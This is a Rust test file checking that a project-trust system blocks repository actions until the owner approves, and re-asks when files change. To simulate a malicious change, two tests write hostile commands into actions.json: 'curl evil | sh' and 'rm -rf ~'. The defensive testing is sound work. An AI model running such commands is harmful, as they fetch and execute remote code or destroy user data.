//! Trust, enforced in Rust: what the owner is asked, what is approved, what a change or a link does.

use super::{Owner, RUN_TESTS, Repo, link, service};
use crate::files_panel::{
    ApproveOutcome, OwnerAnswer, ProjectEffect, ProjectFailure, TerminalPlace, TrustStatusRecord,
};

fn status(service: &crate::files_panel::ProjectService, repo: &Repo) -> TrustStatusRecord {
    service.project(repo.root()).expect("a project").status
}

fn runs(
    service: &crate::files_panel::ProjectService,
    repo: &Repo,
) -> Result<Vec<ProjectEffect>, ProjectFailure> {
    service.run_action(repo.root(), "test".into())
}

#[test]
fn nothing_runs_until_the_owner_approves_and_a_declined_approval_changes_nothing() {
    let repo = Repo::new(&[("actions.json", RUN_TESTS)]);
    let owner = Owner::answering([
        OwnerAnswer::Cancelled,
        OwnerAnswer::Failed { message: "wrong finger".into() },
        OwnerAnswer::Approved,
    ]);
    let (_data, service) = service(&owner);
    service.project(repo.root());
    assert!(matches!(runs(&service, &repo), Err(ProjectFailure::Refused { .. })));
    assert_eq!(service.approve(repo.root()), ApproveOutcome::Declined, "dismissed");
    assert_eq!(
        service.approve(repo.root()),
        ApproveOutcome::Failed { message: "wrong finger".into() },
        "not proven"
    );
    assert_eq!(status(&service, &repo), TrustStatusRecord::Untrusted);
    assert!(service.project(repo.root()).expect("project").errors[0].contains("Not trusted: wrong finger"));
    assert!(matches!(runs(&service, &repo), Err(ProjectFailure::Refused { .. })), "still refused");
    assert_eq!(service.approve(repo.root()), ApproveOutcome::Approved);
    assert_eq!(owner.asked(), 3, "the owner is asked every time, and before anything is trusted");
    assert_eq!(status(&service, &repo), TrustStatusRecord::Trusted);
    assert!(runs(&service, &repo).is_ok());
}

#[test]
fn a_caller_that_never_looked_cannot_approve_a_folder_that_is_not_a_project() {
    let dir = tempfile::tempdir().expect("temp dir");
    let owner = Owner::answering([OwnerAnswer::Approved]);
    let (_data, service) = service(&owner);
    let outcome = service.approve(dir.path().to_string_lossy().into_owned());
    assert!(matches!(outcome, ApproveOutcome::Failed { .. }));
    assert_eq!(owner.asked(), 0, "no prompt for a folder with nothing to trust");
}

#[test]
fn a_change_after_approval_asks_again_and_what_was_not_shown_is_not_approved() {
    let repo = Repo::new(&[("actions.json", RUN_TESTS)]);
    let owner = Owner::answering([OwnerAnswer::Approved, OwnerAnswer::Approved]);
    let (_data, service) = service(&owner);
    service.project(repo.root());
    assert_eq!(service.approve(repo.root()), ApproveOutcome::Approved);
    assert!(runs(&service, &repo).is_ok());
    // A `git pull` changes what the action runs.
    repo.put("actions.json", &RUN_TESTS.replace("cargo test", "curl evil | sh"));
    assert_eq!(status(&service, &repo), TrustStatusRecord::Changed);
    assert!(runs(&service, &repo).is_err(), "the changed content does not run on the old approval");
    // The tab showed the changed content; then the file changes once more while the owner looks at the
    // dialog. What is trusted is what was shown, so the project reads "changed", never trusted unseen.
    service.project(repo.root());
    let shown_then_changed = {
        repo.put("actions.json", &RUN_TESTS.replace("cargo test", "rm -rf ~"));
        service.approve(repo.root())
    };
    assert_eq!(shown_then_changed, ApproveOutcome::Approved);
    assert_eq!(status(&service, &repo), TrustStatusRecord::Changed);
    assert!(runs(&service, &repo).is_err(), "the content that is there now was never approved");
}

#[test]
fn revoking_takes_trust_away_and_trust_survives_a_restart_of_the_service() {
    let repo = Repo::new(&[("actions.json", RUN_TESTS)]);
    let owner = Owner::answering([OwnerAnswer::Approved]);
    let (data, first) = service(&owner);
    first.project(repo.root());
    assert_eq!(first.approve(repo.root()), ApproveOutcome::Approved);
    let second = crate::files_panel::ProjectService::in_dir(data.path(), owner.clone());
    assert_eq!(status(&second, &repo), TrustStatusRecord::Trusted, "kept in the data folder");
    second.revoke(repo.root());
    assert_eq!(status(&second, &repo), TrustStatusRecord::Untrusted);
    assert!(runs(&second, &repo).is_err());
    let third = crate::files_panel::ProjectService::in_dir(data.path(), owner);
    assert_eq!(status(&third, &repo), TrustStatusRecord::Untrusted, "and so is the revoke");
}

#[test]
fn trust_follows_a_window_to_the_profile_it_moved_to() {
    let repo = Repo::new(&[("actions.json", RUN_TESTS)]);
    let owner = Owner::answering([OwnerAnswer::Approved]);
    let (home, service) = service(&owner);
    let other = tempfile::tempdir().expect("other profile's folder");
    service.project(repo.root());
    assert_eq!(service.approve(repo.root()), ApproveOutcome::Approved);
    assert!(runs(&service, &repo).is_ok());
    service.follow_dir(other.path());
    assert_eq!(status(&service, &repo), TrustStatusRecord::Untrusted, "the new profile never approved it");
    assert!(runs(&service, &repo).is_err(), "so nothing runs under the old profile's approval");
    service.follow_dir(home.path());
    assert_eq!(
        status(&service, &repo),
        TrustStatusRecord::Trusted,
        "and back, the first profile's approval is its own"
    );
}

#[test]
fn a_link_out_of_the_project_is_never_read_so_it_can_neither_run_nor_be_trusted() {
    let outside = tempfile::tempdir().expect("temp dir");
    std::fs::write(outside.path().join("actions.json"), RUN_TESTS).expect("write");
    let repo = Repo::new(&[("config.json", "{}")]);
    link(&outside.path().join("actions.json"), &repo.path().join(".wormhole/actions.json"));
    let owner = Owner::answering([OwnerAnswer::Approved]);
    let (_data, service) = service(&owner);
    let state = service.project(repo.root()).expect("project");
    assert!(state.errors.iter().any(|e| e.contains("outside")), "{:?}", state.errors);
    assert!(state.actions.is_empty());
    assert!(!state.asks_for_trust || state.commands.is_empty(), "a file that does not load lists no command");
    let approved = service.approve(repo.root());
    assert!(
        matches!(approved, ApproveOutcome::Failed { .. }),
        "{approved:?}: it can't be trusted while it fails to load"
    );
    assert_eq!(owner.asked(), 0);
    assert!(runs(&service, &repo).is_err());
}

#[test]
fn the_layout_and_prompts_follow_the_same_rule() {
    let repo = Repo::new(&[
        ("layout.json", r#"{"sessions": [{"name": "dev", "run": "make dev", "cwd": "sub", "focus": true}]}"#),
        ("prompts/review.md", "---\ntitle: Review it\ndescription: for bugs\n---\nLook at the diff.\n"),
    ]);
    let owner = Owner::answering([OwnerAnswer::Approved]);
    let (_data, service) = service(&owner);
    // A prompt only pastes, so it works untrusted; the layout runs commands, so it waits.
    assert_eq!(service.prompt_text(repo.root(), "review".into()).expect("text"), "Look at the diff.");
    assert_eq!(
        service.send_prompt(repo.root(), "review".into()).expect("effect"),
        vec![ProjectEffect::Paste {
            place: TerminalPlace::Current,
            text: "Look at the diff.".into(),
            submit: false
        }]
    );
    assert!(matches!(service.open_layout(repo.root()), Err(ProjectFailure::Refused { .. })));
    service.project(repo.root());
    service.approve(repo.root());
    let effects = service.open_layout(repo.root()).expect("trusted");
    let ProjectEffect::OpenTerminals { terminals } = &effects[0] else { panic!("{effects:?}") };
    assert_eq!(terminals[0].cwd, repo.path().join("sub").to_string_lossy());
    assert_eq!(terminals[0].run.as_deref(), Some("make dev"));
    assert!(terminals[0].focus);
    service.set_feature(repo.root(), "prompts".into(), false).expect("switch");
    assert!(matches!(service.prompt_text(repo.root(), "review".into()), Err(ProjectFailure::Refused { .. })));
}

#[test]
fn a_root_that_leaves_the_project_is_not_one() {
    let repo = Repo::new(&[("actions.json", RUN_TESTS)]);
    let (_data, service) = service(&Owner::answering([OwnerAnswer::Approved]));
    let above = repo.path().join("..").to_string_lossy().into_owned();
    assert!(matches!(service.run_action(above, "test".into()), Err(ProjectFailure::NotFound { .. })));
    assert!(matches!(
        service.set_feature("/nonexistent".into(), "actions".into(), true),
        Err(ProjectFailure::NotFound { .. })
    ));
}

#[test]
fn an_approval_given_through_another_desk_is_what_the_tab_says_next() {
    // The project commands window approves through a desk of its own, over the same file.
    let repo = Repo::new(&[("actions.json", RUN_TESTS)]);
    let owner = Owner::answering([OwnerAnswer::Approved]);
    let (data, tab) = service(&owner);
    assert_eq!(status(&tab, &repo), TrustStatusRecord::Untrusted);
    let window = crate::files_panel::ProjectService::in_dir(data.path(), owner.clone());
    window.project(repo.root());
    assert_eq!(window.approve(repo.root()), ApproveOutcome::Approved);
    assert_eq!(status(&tab, &repo), TrustStatusRecord::Trusted);
}

#[test]
fn a_worktree_of_a_project_needs_it_trusted_with_its_settings_on() {
    let plain = tempfile::tempdir().expect("temp dir");
    let owner = Owner::answering([OwnerAnswer::Approved]);
    let (_data, service) = service(&owner);
    let no_project = plain.path().to_path_buf();
    assert_eq!(service.worktree_refusal(&no_project), None, "no project, no condition");
    let repo = Repo::new(&[("config.json", r#"{"settings":{"worktree":{"setup":"npm ci"}}}"#)]);
    assert!(service.worktree_refusal(&repo.path()).is_some(), "not trusted yet");
    service.project(repo.root());
    assert_eq!(service.approve(repo.root()), ApproveOutcome::Approved);
    assert_eq!(service.worktree_refusal(&repo.path()), None, "trusted");
}
